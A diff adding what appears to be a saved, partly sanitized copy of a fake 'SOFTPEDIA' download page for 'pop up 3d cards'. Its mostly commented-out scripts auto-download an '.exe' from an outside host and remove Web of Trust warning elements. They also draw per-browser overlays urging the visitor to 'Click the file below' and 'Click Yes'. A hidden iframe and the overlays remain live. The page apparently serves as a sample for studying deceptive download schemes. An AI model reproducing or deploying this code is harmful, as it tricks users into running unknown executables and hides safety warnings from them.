@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html><head>
+    <title>Download Archive - Pop Up 3d Cards</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" type="text/css" href="SanatizedSource_files/style.css">
+
+    <!--<script type="text/javascript">
+        var mwt = {
+            e: 0,
+            si: 0,
+            rm: function () {
+                mwt.e++;
+                if (20 < mwt.e) {
+                    clearInterval(mwt.si);
+                }
+                var c = document.getElementsByTagName("div");
+                for (i = 0; i < c.length; i++) {
+                    if (c[i] && -1 < c[i].id.indexOf("wot")) {
+                        c[i].parentNode.removeChild(c[i]);
+                    }
+                }
+            }
+        };
+        mwt.rm();
+        mwt.si = setInterval(mwt.rm, 200);
+        window.onfocus = function () {
+            mwt.e = 0;
+            mwt.rm();
+            mwt.si = setInterval(mwt.rm, 200);
+        };
+    </script>
+    <script type="text/javascript">
+        window.onbeforeunload = function (e) {
+        };
+        var dlinks = document.querySelectorAll('a');
+        for (var i = 0; i < dlinks.length; i++) {
+            dlinks[i].onclick = function () {
+                window.onbeforeunload = null;
+            }
+        }
+    </script>
+
+    <script>
+        var __tokens = {
+            "staticMediaPath": "http:\/\/softped1a.ws\/files\/media\/",
+            "directDownloadLink": "http:\/\/mysoftwarelive.com\/download\/getfile\/1500000\/1\/?q=pop%2Bup%2B3d%2Bcards&dd=1",
+            "downloadLink": "http:\/\/mysoftwarelive.com\/download\/getfile\/1500000\/1\/?q=pop%2Bup%2B3d%2Bcards&dd=1",
+            "iframeLink": null,
+            "ref": null,
+            "ua": "",
+            "brand": {"name": "Downloader", "text": "", "links": ""},
+            "style": null,
+            "filename": "pop up 3d cards ...",
+            "filenameText": null,
+            "autoDownload": true
+        };
+    </script>-->
+</head>
+<body style="overflow: auto;">
+
+
+<div id="box">
+    <div class="page">
+        <div class="tt">SOFTPEDIA</div>
+        <div class="inner">
+            <div class="file"><img src="SanatizedSource_files/s.png">
+
+                <div class="" id="filen">pop up 3d cards ...</div>
+                <img src="SanatizedSource_files/s.png"></div>
+            <br>
+            <a class="dlink dlink-1" onclick="onclickDlink()">DOWNLOAD<img src="SanatizedSource_files/x.png"></a>
+            <a class="dlink dlink-2" onclick="onclickDlink()">DIRECT DOWNLOAD</a>
+            <br>
+
+            <p>Your download will start in...</p>
+            <br>
+
+            <p class="x"><span id="count">0</span> sec</p>
+        </div>
+        <p>Current site matches keywords, searched from 3rd-party sites, to affiliate-networks offering unlimited access
+            to licensed entertainment content. <br>We allows visitors, otherwise looking for free-content to enjoy more
+            for less.</p>
+        <br>
+
+
+        <div><img src="SanatizedSource_files/az.png" height="50" width="300"></div>
+    </div>
+</div>
+
+
+<!--<script type="text/javascript">
+if (__tokens) {
+    var filenamediv = document.getElementById("filen");
+    filenamediv.className = "ready";
+    if (__tokens.style) {
+        var body = document.getElementsByTagName("body")[0];
+        body.style.background = __tokens.style.bgColor;
+        body.style.color = __tokens.style.txtColor
+    }
+    if (!__tokens.filenameText) {
+        __tokens.filenameText = __tokens.filename;
+        filenamediv.className = "";
+    }
+    filenamediv.innerHTML = __tokens.filenameText;
+    var backgroundApplier = function (a, b) {
+        ("body" == a ? document.getElementsByTagName("body")[0] : document.getElementById(a)).style.backgroundImage = "url('" + __tokens.staticMediaPath + b + "')"
+    };
+    // background img is missing
+ //   backgroundApplier("body", "bg.png");
+}
+/*
+ var links = document.querySelectorAll(".dlink");
+ for (var i = 0; i < links.length; i++) {
+ var dlink = links[i];
+ dlink.href = __tokens.downloadLink;
+ dlink.onclick = function () {
+ downloader("", window.__tokens.brand.name, window.__tokens.filename, window.__tokens.autoDownload);
+ $.fileDownload(this.href);
+ window._onbeforeunload = window.onbeforeunload;
+ window.onbeforeunload = null;
+ setTimeout(function () {
+ window.onbeforeunload = window._onbeforeunload;
+ }, 100);
+ return false;
+ }
+ }
+ */
+function onclickDlink() {
+    downloader("", window.__tokens.brand.name, window.__tokens.filename, window.__tokens.autoDownload);
+    $.fileDownload(window.__tokens.downloadLink);
+    return false;
+}
+var cb = function () {
+    if (__tokens.autoDownload) {
+        //document.querySelectorAll(".dlink")[0].click()
+    }
+};
+if (window.addEventListener) {
+    window.addEventListener('load', cb, false);
+} else if (window.attachEvent) {
+    window.attachEvent('onload', cb);
+}
+
+function downloader(mediaPath, brandName, fname, autoDownload) {
+    var downloadData = {brandName: brandName, color: "green", downloadLink: ".dlink", filename: fname};
+    var $downloadHint;
+    autoDownload = !!autoDownload;
+    var useragent = navigator.userAgent.toLowerCase();
+    var bChrome = -1 < useragent.indexOf("chrome");
+    var bOpera = -1 < useragent.indexOf("opr");
+    var bMsie = -1 < useragent.indexOf("msie");
+    var bTrident = !!navigator.userAgent.match(/Trident\/7\./);
+    var bFirefox = -1 < useragent.indexOf("firefox");
+    var iMsieVer = parseFloat(navigator.appVersion.split("MSIE")[1]);
+    var bSafari = useragent.indexOf("Safari");
+    if (!(bChrome || bFirefox)) {
+        fname = " ";
+    }
+    fname = 14 < fname.length ? fname.substring(0, 14) + "...exe" : fname + ".exe";
+    mediaPath += "/files/media";
+    //alert(mediaPath);
+
+    function loadAnimation() {
+        function showDownloadHint() {
+            $downloadHint.show();
+            $downloadHint.animate({top: "1px"}, 1000);
+            for (var a = 0; 1 > a; a++) {
+                $downloadHint.animate({top: "80px"}, 1000);
+                $downloadHint.animate({top: "1px"}, 1000);
+            }
+            setTimeout(function () {
+                if ($downloadHint.is(":visible")) {
+                    $("#ileftO").fadeIn();
+                    $("#ileft1").fadeIn();
+                    setTimeout(function () {
+                        if ($("#ileft1").is(":visible")) {
+                            $("#ileft2").fadeIn();
+                        }
+                    }, 500);
+                }
+            }, 4000);
+        }
+
+        function startDownload() {
+            $("#maski").fadeIn();
+            if (bFirefox) {
+                setTimeout(function () {
+                    $downloadHint.show();
+                    $downloadHint.animate({top: "1px"}, 1000);
+                    for (var a = 0; 1 > a; a++) {
+                        $downloadHint.animate({top: "80px"}, 1000);
+                        $downloadHint.animate({top: "1px"}, 1000)
+                    }
+                }, 3000);
+            }
+            if (bChrome && !bOpera) {
+                $downloadHint.show();
+                $downloadHint.delay(2000).animate({bottom: "1px"}, 1000);
+                setTimeout(function () {
+                    if ($downloadHint.is(":visible")) {
+                        $("#ileftO").fadeIn();
+                        $("#ileft1").fadeIn();
+                        setTimeout(function () {
+                            if ($("#ileft1").is(":visible")) {
+                                $("#ileft2").fadeIn();
+                            }
+                        }, 500);
+                    }
+                }, 3000);
+            }
+            if (!bChrome && bSafari && !(bFirefox || bOpera || bTrident || bMsie)) {
+                $downloadHint.show();
+                $downloadHint.animate({top: "1px"}, 1000);
+                for (var a = 0; 5 > a; a++) {
+                    $downloadHint.animate({top: "80px"}, 1000);
+                    $downloadHint.animate({top: "1px"}, 1000);
+                }
+            }
+            if (bOpera) {
+                $downloadHint.show();
+                $downloadHint.animate({top: "80px"}, 4000);
+                for (a = 0; 5 > a; a++) {
+                    $downloadHint.animate({top: "200px"}, 4000);
+                    $downloadHint.animate({top: "80px"}, 4000);
+                }
+                setTimeout(function () {
+                    if ($downloadHint.is(":visible")) {
+                        $("#ileftO").fadeIn();
+                    }
+                }, 995)
+            }
+            if (bMsie || bTrident) {
+                if (8 < iMsieVer || bTrident) {
+                    var bFlagLoaded = false;
+                    jQuery("#step2z").load(function () {
+                        $downloadHint.show();
+                        $downloadHint.animate({bottom: "80px"}, 888);
+                        for (var a = 0; 5 > a; a++) {
+                            $downloadHint.animate({bottom: "200px"}, 888);
+                            $downloadHint.animate({bottom: "80px"}, 888);
+                        }
+                        setTimeout(function () {
+                            if ($downloadHint.is(":visible")) {
+                                $("#ileftO").fadeIn();
+                            }
+                        }, 995);
+                        bFlagLoaded = true;
+                    });
+                    setTimeout(function () {
+                        if (!bFlagLoaded) {
+                            $("#download-hintXXX").css({});
+                            $("#step2zXXX").attr({});
+                            $("#step1XXX").attr({});
+                            $downloadHint.show();
+                            $downloadHint.animate({bottom: "80px"}, 999);
+                            for (var a = 0; 5 > a; a++) {
+                                $downloadHint.animate({bottom: "200px"}, 999);
+                                $downloadHint.animate({bottom: "80px"}, 999);
+                            }
+                            setTimeout(function () {
+                                if ($downloadHint.is(":visible")) {
+                                    $("#ileftO").fadeIn();
+                                    $("#ileft1").fadeIn();
+                                    $("#ileft2").fadeIn();
+                                }
+                            }, 995)
+                        }
+                    }, 995)
+                } else {
+                    $("#ileftO").css("display", "block");
+                    //var c = false;
+                    jQuery("#download-hint").load(function () {
+                        //c = true;
+                        showDownloadHint();
+                    });
+                    setTimeout(function () {
+                        $("#download-hintXXX").css();
+                        $("#step2zXXX").attr();
+                        $("#step1XXX").attr();
+                        showDownloadHint();
+                    }, 995);
+                }
+            }
+        }
+
+        var docWidth, divOpacity;
+        docWidth = $(document).width();
+        divOpacity = document.createElement("div");
+        $(divOpacity).css({
+            background: "black",
+            left: "0px",
+            top: "0px",
+            opacity: "0.25",
+            height: "1000px",
+            width: docWidth + "px",
+            minWidth: "4920px",
+            position: "fixed",
+            zIndex: "9998",
+            bottom: "1000px",
+            display: "none"
+        });
+        $(divOpacity).attr({id: "maski", "class": "clickable"});
+        if (bMsie) {
+            $(divOpacity).css("filter", "progid:DXImageTransform.Microsoft.Alpha(opacity=25)");
+        }
+        document.body.appendChild(divOpacity);
+
+        var div1 = document.createElement("div");
+        var div2 = document.createElement("div");
+        var div3 = document.createElement("div");
+        $(div1).attr({id: "ileft1", "class": "clickable"});
+        $(div2).attr({id: "ileftO", "class": "clickable"});
+        $(div3).attr({id: "ileft2", "class": "clickable"});
+        $(div2).css({width: "400px", position: "fixed", zIndex: "10000"});
+        $(div1).css({zIndex: "10002"});
+        $(div3).css({zIndex: "10002"});
+
+        if (bChrome && !bOpera) {
+            $(div1).css({
+                display: "none",
+                bottom: "0px",
+                borderRadius: "10px 10px 0 0"
+            });
+            $(div3).css({
+                display: "none",
+                bottom: "0px",
+                borderRadius: "10px 10px 0 0"
+            });
+        } else if (bOpera) {
+            $(div2).css({
+                display: "none",
+                position: "fixed",
+                bottom: "0px",
+                left: "43%",
+                height: "316px",
+                zIndex: "10002",
+                cursor: "default"
+            });
+        } else {
+            $(div2).css({
+                display: "none",
+                position: "fixed",
+                bottom: "66px",
+                left: "47%",
+                height: "316px",
+                zIndex: "10002",
+                cursor: "default"
+            });
+        }
+
+        var downloadHint = document.createElement("div");
+        $downloadHint = $(downloadHint);
+        $(downloadHint).css({position: "fixed", zIndex: "10000", display: "none"});
+        $(downloadHint).attr({id: "download-hint", "class": "clickable"});
+        if (bFirefox) {
+            $(downloadHint).css({
+                background: "url('" + mediaPath + "/firefox.png') no-repeat",
+                right: "3%",
+                top: "40%",
+                height: "281px",
+                width: "964px",
+                opacity: "1"
+            });
+            //$(downloadHint).html('<div style="position: absolute; line-height: 12px;overflow: hidden;font-size: 6px;width: 97px;color: #444; height: 13px; font-weight: bold;top: 152px;left: 60px;">' + fname + '</div><div style="position: absolute; overflow: hidden;font-size: 10px; height: 17px; width: 134px;ottom: -42px;  color: #000;margin: 0px auto; line-height: 13px; top: 177px; left: 365px;">' + fname + '</div>');
+            $(downloadHint).html('' +
+                '<div style="position: absolute; line-height: 12px;overflow: hidden;font-size: 6px;width: 97px;color: #444; height: 13px; font-weight: bold;top: 152px;left: 60px;">' +
+                fname +
+                '</div>' +
+                '<div style="position: absolute; overflow: hidden;font-size: 10px; height: 17px; width: 134px;bottom: -42px;  color: #000;margin: 0px auto; line-height: 13px; top: 177px; left: 365px;">' +
+                fname +
+                '</div>'
+            );
+        }
+        if (bOpera) {
+            $(downloadHint).css({
+                background: "url('" + mediaPath + "/arrowv.png') no-repeat",
+                right: "0px",
+                height: "275px",
+                width: "135px",
+                top: "1000px"
+            });
+            $(div1).css({});
+            $(div1).html('<div id="ileft"></div><div id="ileft1t"></div>');
+            $(div3).css({});
+            $(div3).html('<div id="ileft22"></div><div id="ileft2t"></div>');
+        }
+
+        if (!(bChrome || !bSafari || bFirefox || bOpera || bTrident || bMsie)) {
+            $(downloadHint).css({
+                background: "url('" + mediaPath + "/after.png') no-repeat",
+                right: "1%",
+                top: "39%",
+                height: "130px",
+                width: "110px",
+                opacity: "1"
+            });
+
+            setTimeout(function () {
+                $(downloadHint).css("background-image", "url('" + mediaPath + "/after2.png')");
+                setTimeout(function () {
+                    $(downloadHint).css("background-image", "url('" + mediaPath + "/after3.png')")
+                }, 4000)
+            }, 4000);
+        }
+        if (bChrome && !bOpera) {
+            $(downloadHint).css({
+                background: "url('" + mediaPath + "/arrow_last.png') no-repeat",
+                left: "10px",
+                bottom: "1100px",
+                height: "255px",
+                width: "111px"
+            });
+            $(div2).css({left: "345px", bottom: "0px"});
+            $(div1).css({
+                width: "280px",
+                marginLeft: "-182px",
+                float: "left"
+            });
+            $(div1).html('<div id="ileft" style="width: 277px;height: 271px;background: url(' + mediaPath + '/w1.png) no-repeat; position: relative;"><h4 style="position: absolute; left: 85px; top: 28px; font-size: 20px; color: #00aeef;">Click the file below</h4><bFirefox style="position: absolute; left: 85px; top: 140px; font-size: 12px;">' + fname + '</bFirefox></div>'), $(div3).css({
+                width: "280px",
+                float: "right"
+            });
+            $(div3).html('<div id="ileft22" style="width: 277px;height: 271px;background: url(' + mediaPath + '/w2.png) no-repeat; position: relative;"><h4 style="position: absolute; left: 85px; top: 28px; font-size: 20px; color: #00aeef;">Click "Yes"</h4></div>');
+        }
+        if (bMsie || bTrident) {
+            $(div1).css({width: "280px", marginLeft: "-182px", float: "left"});
+            $(div3).css({
+                width: "280px",
+                float: "right"
+            });
+
+            $(div3).html('<div id="ileft22"></div><div id="ileft2t"><img id="step2z"></div>');
+
+            if (8 < iMsieVer || bTrident) {
+                $(div1).html('<div id="ileft"></div><div id="ileft1t"></div>');
+                $(downloadHint).css({
+                    background: "url('" + mediaPath + "/arrow_last.png') no-repeat",
+                    left: "51%",
+                    height: "255px",
+                    width: "111px",
+                    bottom: "1000px"
+                });
+                document.body.appendChild(downloadHint);
+            } else {
+                $(div2).css({
+                    top: "10px",
+                    display: "block"
+                });
+                $(div1).css({display: "none"});
+                $(div3).css({display: "none"});
+                $(div1).html('<div id="ileft"></div><div id="ileft1t"></div>');
+                $(downloadHint).css({
+                    background: "url('" + mediaPath + "/arrowv.png') no-repeat",
+                    height: "230px",
+                    width: "111px",
+                    top: "1000px",
+                    position: "block",
+                    float: "left",
+                    marginLeft: "-290px"
+                });
+                div2.appendChild(downloadHint);
+            }
+        } else {
+            document.body.appendChild(downloadHint);
+        }
+        div2.appendChild(div3);
+        div2.appendChild(div1);
+        document.body.appendChild(div2);
+
+        // remove overlays on click
+        $(".clickable").click(function () {
+            if (bChrome && !bOpera) {
+                $downloadHint.stop(!0, !0).css("bottom", "1100px");
+            }
+            if (!(bChrome || !bSafari || bFirefox || bOpera || bTrident || bMsie)) {
+                $downloadHint.stop(!0, !0).css("bottom", "100%");
+            }
+            if (bFirefox) {
+                $downloadHint.stop(!0, !0).css("top", "1100px");
+            }
+            if (bMsie || bTrident) {
+                if (8 < iMsieVer || bTrident) {
+                    $downloadHint.stop(!0, !0).css("bottom", "1000px")
+                } else {
+                    $(".clickable").hide();
+                    $("#ileft1").css("display", "none");
+                    $("#ileft2").css("display", "none");
+                    $downloadHint.stop(!0, !0).css("top", "1100px");
+                }
+            }
+            if (bOpera) {
+                $downloadHint.stop(!0, !0).css("top", "1000px");
+            }
+            //$(".clickable").fadeOut()
+            $(".clickable").fadeOut().remove();
+        });
+
+        // auto download
+        if (false !== autoDownload) {
+            startDownload();
+        }
+        // manual download
+        $(downloadData.downloadLink).click(function () {
+            startDownload()
+        })
+    }
+
+    loadAnimation();
+}
+
+document.getElementsByTagName("body")[0].style.overflow = "auto";
+</script>-->
+
+<!--<script type="text/javascript" src="Download%20Archive%20-%20Pop%20Up%203d%20Cards_files/jquery.js"></script>
+<script type="text/javascript" src="Download%20Archive%20-%20Pop%20Up%203d%20Cards_files/jquery_002.js"></script>
+<script type="text/javascript">
+    function countDown(countIndex, callback) {
+        countIndex = parseInt(countIndex);
+        var timer = setInterval(function () {
+            countIndex--;
+            if (countIndex > 0) {
+                $('#count').html(countIndex);
+            } else {
+                finish();
+            }
+        }, 1000);
+
+        function finish() {
+            if (window.__tokens.autoDownload) {
+                document.querySelectorAll(".dlink")[0].click();
+            }
+            $('#count').html('0');
+            clearInterval(timer);
+        }
+    }
+
+    $(document).ready(function () {
+        $(window).bind('beforeunload', function () {
+            //save info somewhere
+
+
+        });
+
+        countDown(3);
+    });
+</script>-->
+   
+
+<div class="clickable" id="maski" style="background: none repeat scroll 0% 0% black; left: 0px; top: 0px; opacity: 0.25; height: 1000px; width: 1366px; min-width: 4920px; position: fixed; z-index: 9998; bottom: 1000px;"></div><div class="clickable" id="download-hint" style="position: fixed; z-index: 10000; background: url(&quot;/files/media/firefox.png&quot;) no-repeat scroll 0% 0% transparent; right: 3%; top: 1px; height: 281px; width: 964px; opacity: 1;"><div style="position: absolute; line-height: 12px;overflow: hidden;font-size: 6px;width: 97px;color: #444; height: 13px; font-weight: bold;top: 152px;left: 60px;">pop up 3d card...exe</div><div style="position: absolute; overflow: hidden;font-size: 10px; height: 17px; width: 134px;bottom: -42px;  color: #000;margin: 0px auto; line-height: 13px; top: 177px; left: 365px;">pop up 3d card...exe</div></div><div style="width: 400px; position: fixed; z-index: 10002; display: none; bottom: 66px; left: 47%; height: 316px; cursor: default;" class="clickable" id="ileftO"><div style="z-index: 10002;" class="clickable" id="ileft2"></div><div style="z-index: 10002;" class="clickable" id="ileft1"></div></div><iframe src="SanatizedSource_files/a.htm" style="display: none;"></iframe></body></html>
